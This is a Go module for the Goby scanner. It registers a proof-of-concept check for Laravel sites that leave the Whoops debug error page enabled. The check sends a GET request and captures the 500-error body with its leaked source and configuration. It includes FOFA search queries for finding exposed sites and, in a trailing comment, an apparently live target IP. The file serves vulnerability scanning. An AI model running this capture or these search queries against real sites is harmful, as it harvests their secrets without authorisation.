package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "Laravel Whoops debug Information Disclosure",
    "Description": "<p>Whoops is an error trapping and debugging PHP library for PHP environments.</p><p>When the developer tested the website service, he did not turn off the installed Whoops style error handler, resulting in leaking source code and various configuration information.</p>",
    "Product": "whoops",
    "Homepage": "https://github.com/filp/whoops",
    "DisclosureDate": "2022-07-11",
    "Author": "abszse",
    "FofaQuery": "body=\"Whoops container\" && body=\"There was an error\"",
    "GobyQuery": "body=\"Whoops container\" && body=\"There was an error\"",
    "Level": "2",
    "Impact": "<p>When the developer tested the website service, he did not turn off the installed Whoops style error handler, resulting in leaking source code and various configuration information.</p>",
    "Recommendation": "<p>1. Remove Whoops style error handler. 2. Save the error message to the database or file log, and view the error message from the log or data.</p>",
    "References": [
        "开发人员在测试网站服务的时候，没有关闭已安装Whoops样式错误处理器，导致泄漏源码和各种配置信息。"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Whoops\\Handler\\PrettyPageHandler",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Whoops\\Handler\\PrettyPageHandler",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "Laravel Whoops debug 信息泄漏漏洞",
            "Product": "whoops",
            "Description": "<p>Whoops 是适用于PHP环境的错误捕获与调试PHP库。<br></p><p>开发人员在测试网站服务的时候，没有关闭已安装Whoops样式错误处理器，导致泄漏源码和各种配置信息。<br></p>",
            "Recommendation": "<p>1、删除Whoops样式错误处理器。2、保存报错信息到数据库或文件日志中，从日志或者数据中来看报错信息。<br></p>",
            "Impact": "<p>开发人员在测试网站服务的时候，没有关闭已安装Whoops样式错误处理器，导致泄漏源码和各种配置信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Laravel Whoops debug Information Disclosure",
            "Product": "whoops",
            "Description": "<p>Whoops is an error trapping and debugging PHP library for PHP environments.<br></p><p>When the developer tested the website service, he did not turn off the installed Whoops style error handler, resulting in leaking source code and various configuration information.<br></p>",
            "Recommendation": "<p>1. Remove Whoops style error handler. 2. Save the error message to the database or file log, and view the error message from the log or data.<br></p>",
            "Impact": "<p>When the developer tested the website service, he did not turn off the installed Whoops style error handler, resulting in leaking source code and various configuration information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}

//https://103.84.172.3/
